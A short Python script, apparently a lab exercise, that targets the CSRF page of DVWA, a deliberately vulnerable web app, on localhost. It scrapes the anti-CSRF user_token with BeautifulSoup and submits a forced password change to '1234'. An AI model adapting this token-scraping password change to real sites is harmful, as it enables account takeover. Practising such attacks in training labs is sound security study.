import requests 
from bs4 import BeautifulSoup

s = requests.Session()

r = s.get("http://localhost/DVWA/vulnerabilities/csrf/")

soup = BeautifulSoup(r.text, "html.parser")
token = soup.find("input", {"name" : "user_token"})["value"]

payload = {
    "password_new": "1234",
    "password_conf": "1234",
    "user_token": token,
    "Change": "Change"
}
s.get("http://localhost/DVWA/vulnerabilities/csrf/", params=payload)
